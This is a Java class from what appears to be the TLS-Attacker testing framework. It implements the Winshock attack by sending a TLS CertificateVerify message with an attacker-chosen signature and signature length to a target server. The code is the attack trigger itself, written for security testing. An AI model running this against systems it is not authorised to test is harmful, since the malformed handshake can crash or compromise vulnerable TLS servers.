/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.impl;

import anonymous.tlsattacker.tls.Attacker;
import anonymous.tlsattacker.attacks.config.WinshockCommandConfig;
import anonymous.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import anonymous.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import anonymous.tlsattacker.modifiablevariable.integer.IntegerModificationFactory;
import anonymous.tlsattacker.modifiablevariable.integer.ModifiableInteger;
import anonymous.tlsattacker.tls.config.ConfigHandler;
import anonymous.tlsattacker.tls.constants.HandshakeMessageType;
import anonymous.tlsattacker.tls.protocol.handshake.CertificateVerifyMessage;
import anonymous.tlsattacker.tls.workflow.TlsContext;
import anonymous.tlsattacker.tls.workflow.WorkflowExecutor;
import anonymous.tlsattacker.tls.workflow.WorkflowTrace;
import anonymous.tlsattacker.transport.TransportHandler;
import anonymous.tlsattacker.util.ArrayConverter;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Allows to execute the Winshock attack, by setting the CertificateVerify
 * protocol message properties. I
 * 
 * @author anonymous anonymous (anonymous.anonymous@anonymous)
 */
public class WinshockAttack extends Attacker<WinshockCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(WinshockAttack.class);

    public WinshockAttack(WinshockCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();

	ModifiableByteArray signature = new ModifiableByteArray();
	signature.setModification(ByteArrayModificationFactory.explicitValue(ArrayConverter
		.bigIntegerToByteArray(config.getSignature())));

	ModifiableInteger signatureLength = new ModifiableInteger();
	if (config.getSignatureLength() == null) {
	    signatureLength.setModification(IntegerModificationFactory.explicitValue(signature.getValue().length));
	} else {
	    signatureLength.setModification(IntegerModificationFactory.explicitValue(config.getSignatureLength()));
	}

	CertificateVerifyMessage cvm = (CertificateVerifyMessage) trace
		.getFirstHandshakeMessage(HandshakeMessageType.CERTIFICATE_VERIFY);
	cvm.setSignature(signature);
	cvm.setSignatureLength(signatureLength);

	workflowExecutor.executeWorkflow();

	tlsContexts.add(tlsContext);

	transportHandler.closeConnection();
    }
}
